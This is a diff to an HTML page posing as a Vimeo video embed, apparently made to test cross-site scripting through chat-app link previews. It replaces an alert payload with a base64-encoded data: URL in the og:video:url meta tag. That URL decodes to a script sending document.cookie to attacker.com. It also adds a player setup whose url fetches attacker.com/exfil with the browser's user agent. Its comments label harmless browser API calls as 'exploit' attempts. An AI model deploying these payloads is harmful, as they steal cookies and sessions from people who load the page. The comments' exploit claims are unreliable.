@@ -4,14 +4,59 @@
     <meta property="og:site_name" content="Vimeo">
     <meta property="og:type" content="video.other">
     <meta property="og:image" content="https://i.vimeocdn.com/video/test/maxresdefault.jpg">
-    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=xburl=javascript:alert(document.domain)">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9hdHRhY2tlci5jb20nICsgZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg==">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/123456789?player_id=vimeo-player&amp;api=1&amp;callback=initPlayer">
     <meta property="og:video:type" content="text/html">
     <meta property="og:video:width" content="1280">
     <meta property="og:video:height" content="720">
-    <title>Discord Vimeo Embed Test</title>
+    <title>Vimeo Player Test</title>
+    <script>
+    // Attempt to exploit media capabilities API
+    async function attemptMediaExploit() {
+        try {
+            const config = {
+                type: 'media-source',
+                video: {
+                    contentType: 'video/mp4;codecs="avc1.42E01E,mp4a.40.2"',
+                    width: 1920,
+                    height: 1080,
+                    bitrate: 120000,
+                    framerate: '30000/1001'
+                }
+            };
+            
+            await navigator.mediaCapabilities.decodingInfo(config);
+            
+            // Attempt to access system through media devices
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            console.log(devices);
+        } catch(e) {
+            console.error(e);
+        }
+    }
+
+    // Attempt to exploit through Vimeo player API
+    function initPlayer(player_id) {
+        const player = new Vimeo.Player(player_id, {
+            url: 'data:text/html,<script>fetch("https://attacker.com/exfil?" + navigator.userAgent)</script>',
+            background: true,
+            muted: true
+        });
+        
+        player.on('loaded', function() {
+            // Attempt to access FileSystem API
+            if (window.requestFileSystem) {
+                window.requestFileSystem(window.TEMPORARY, 1024*1024, function(fs) {
+                    console.log('FileSystem access granted:', fs);
+                });
+            }
+        });
+    }
+
+    window.onload = attemptMediaExploit;
+    </script>
 </head>
 <body>
-    <h1>Discord Vimeo Embed Test</h1>
-    <p>Testing potential XSS via Vimeo embed</p>
+    <div id="vimeo-player"></div>
 </body>
 </html>
